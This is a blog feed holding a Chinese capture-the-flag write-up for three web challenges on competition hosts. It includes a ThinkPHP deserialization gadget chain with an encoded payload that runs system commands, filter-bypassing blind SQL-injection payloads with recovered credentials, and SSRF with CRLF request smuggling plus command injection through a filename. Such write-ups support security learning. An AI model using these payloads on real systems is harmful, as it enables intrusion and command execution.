<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Str3am&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jlkl.github.io/"/>
  <updated>2022-05-30T08:29:20.210Z</updated>
  <id>https://jlkl.github.io/</id>
  
  <author>
    <name>Str3am</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Web-22</title>
    <link href="https://jlkl.github.io/2022/05/30/Web-22/"/>
    <id>https://jlkl.github.io/2022/05/30/Web-22/</id>
    <published>2022-05-30T08:26:29.000Z</published>
    <updated>2022-05-30T08:29:20.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p>题目内容：最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">lazySave</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">private</span> $data = [];</span><br><span class="line">        <span class="keyword">private</span> $exists = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $table;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">        <span class="keyword">protected</span> $json = [];</span><br><span class="line">        <span class="keyword">protected</span> $jsonAssoc = <span class="keyword">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">'whoami'</span> =&gt; [<span class="string">'cat /flag.txt'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">True</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'whoami'</span> =&gt; [<span class="string">'system'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;json = [<span class="string">'whoami'</span>,[<span class="string">'whoami'</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;jsonAssoc = <span class="keyword">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>zeh<span class="number">1</span><span class="keyword">c</span><span class="number">14</span><span class="keyword">i16</span><span class="keyword">ne</span><span class="number">6</span>hcxxxt.cloudec<span class="keyword">i1</span>.ichunqiu.com/index.php/?s=index/test</span><br><span class="line"></span><br><span class="line">a=O<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span>think<span class="symbol">%5</span>Cmodel<span class="symbol">%5</span>CPivot<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>lazySave<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>data<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span>cat+<span class="symbol">%2</span>Fflag.txt<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">19</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>exists<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">8</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>table<span class="symbol">%22</span><span class="symbol">%3</span>BO<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span>think<span class="symbol">%5</span>Cmodel<span class="symbol">%5</span>CPivot<span class="symbol">%22</span><span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>lazySave<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">17</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>data<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">13</span><span class="symbol">%3</span>A<span class="symbol">%22</span>cat+<span class="symbol">%2</span>Fflag.txt<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">19</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>exists<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">8</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>table<span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%22</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>withAttr<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>system<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>json<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">2</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Bi<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">12</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>jsonAssoc<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>B<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">21</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span>think<span class="symbol">%5</span>CModel<span class="symbol">%00</span>withAttr<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>system<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">7</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>json<span class="symbol">%22</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">2</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>Bi<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>Ba<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>A<span class="symbol">%7</span>Bi<span class="symbol">%3</span>A<span class="number">0</span><span class="symbol">%3</span>Bs<span class="symbol">%3</span>A<span class="number">6</span><span class="symbol">%3</span>A<span class="symbol">%22</span>whoami<span class="symbol">%22</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D<span class="symbol">%7</span>Ds<span class="symbol">%3</span>A<span class="number">12</span><span class="symbol">%3</span>A<span class="symbol">%22</span><span class="symbol">%00</span><span class="symbol">%2</span>A<span class="symbol">%00</span>jsonAssoc<span class="symbol">%22</span><span class="symbol">%3</span>Bb<span class="symbol">%3</span>A<span class="number">1</span><span class="symbol">%3</span>B<span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure><h3 id="简单的渗透"><a href="#简单的渗透" class="headerlink" title="简单的渗透"></a>简单的渗透</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/login.php</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2ze7x0b01kqqb95bxlbq.cloudeci1.ichunqiu.com</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">58</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line"><span class="attr">Origin:</span> <span class="string">http://eci-2ze7x0b01kqqb95bxlbq.cloudeci1.ichunqiu.com</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://eci-2ze7x0b01kqqb95bxlbq.cloudeci1.ichunqiu.com/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914;</span> <span class="string">__jsluid_h=df0d3e87a5da34d8dc5601b87508ebdb;</span> <span class="string">PHPSESSID=s195lkel6hhclv2gq2fhbst6ir</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"></span><br><span class="line"><span class="string">username=a%27%20or%201%20or%20%271%27=%271&amp;password=123456</span></span><br></pre></td></tr></table></figure><p>参考虎符2022 - babysql<br>不同点在于后者过滤的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $r = preg_replace(<span class="string">'/[\s,()#;*~\-]/'</span>,<span class="string">''</span>,$a);</span><br><span class="line">    $r = preg_replace(<span class="string">'/^.*(?=union|binary|regexp|rlike).*$/i'</span>,<span class="string">''</span>,$r);</span><br><span class="line">    <span class="keyword">return</span> (string)$r;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>按照之前的来说，之前的payload可以是这样</p><blockquote><p>参考之前我们写过的wp：<a href="https://demo.hedgedoc.org/uLxXjonDSMiRRO2o2P3deA#babysql" target="_blank" rel="noopener">https://demo.hedgedoc.org/uLxXjonDSMiRRO2o2P3deA#babysql</a></p></blockquote><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>'||case'<span class="number">1</span>'when'<span class="number">1</span>'then'<span class="number">1</span>'else~<span class="number">0</span>+~<span class="number">0</span>+'<span class="number">1</span>'end='<span class="number">0</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><p>这里我们同样构造200和500的不同回显来达到盲注的效果，上面的payload<br>是使用~0这个东西来达成sql语句报错从而回显500的效果。</p><blockquote><p><del>0是mysql里面最大的一个整数，如果这个数再加一就会报错下面的错误：<br>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in ‘(</del>(0) + 1)’</p></blockquote><p>我们再看看上面的过滤，过滤了<del>符号，那我们怎么报错呢？<br>我们可以看看具体</del>0是多少：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">| ~0                   |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">| 18446744073709551615 |</span><br><span class="line"><span class="code">+----------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>那我们直接使用这个数字不就行了？但是还有一个问题，空格怎么办？空格是被过滤掉的<br>如果直接使用18446744073709551615+1，那么payload长这样：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>'||case'<span class="number">1</span>'when'<span class="number">1</span>'then'<span class="number">1</span>'else <span class="number">18446744073709551615</span>+<span class="number">1</span> end='<span class="number">0</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><p>里面是有2个空格的，但是直接’18446744073709551615’+’1’又不能整数溢出。其实我们想~其实是取反的符号，对0取反才达到了最大整数的效果，那么我们不仅有取反，还有异或等其他位操作，所以我们构造一个异或即可：<br>最后根据我们的虎符payload来直接开始爆破账号密码</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>'||<span class="keyword">case</span><span class="string">'1'</span><span class="keyword">when</span>`username`COLLATE<span class="symbol">'utf8mb4_0900_as_cs</span><span class="symbol">'like</span><span class="symbol">'a</span>%<span class="symbol">'then</span><span class="string">'1'</span><span class="keyword">else</span><span class="string">'1'</span>^<span class="number">18446744073709551614</span>%<span class="number">252</span>b2^<span class="string">'1'</span><span class="keyword">end</span>%<span class="number">253</span>d'<span class="number">0</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure><blockquote><p>最后注意爆破的字符集里面的 _ % 等在like语句里面有明确意义的，爆破的时候记得转义一下</p></blockquote><p>最后跑出来的结果：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号以及密码</span><br><span class="line">awk785969awlfjnlkjlii!@$<span class="comment">%!!</span></span><br><span class="line">PAssw40d_Y0u3_Never_Konwn!@!!</span><br></pre></td></tr></table></figure><p>后面还有php代码解密以及反序列化生成的一些任务，因为比赛结束了，所以没解出这题，很遗憾</p><h3 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h3><p>ssrf+crlf</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zebelhabwvwjvw18eqt.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730; ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914; __jsluid_h=d5688935e29b59feeac61f34a0ba8a3c</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 91</span><br><span class="line"></span><br><span class="line">uri=/admin/rename?oldname=1%26%26newname=1%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure><p>要绕</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c.Request.URL.RawPath != <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%252f 绕过</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.crmeb1.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 92</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">uri=/admin%252frename?oldname=1%26%26newname=1%20HTTP/1.1%0d%0aHost:admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure><p>可以</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`touch <span class="number">123</span>.txt`.crt</span><br></pre></td></tr></table></figure><p>这样来执行命令</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730; ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914; __jsluid_h=d5688935e29b59feeac61f34a0ba8a3c</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 391</span><br><span class="line"></span><br><span 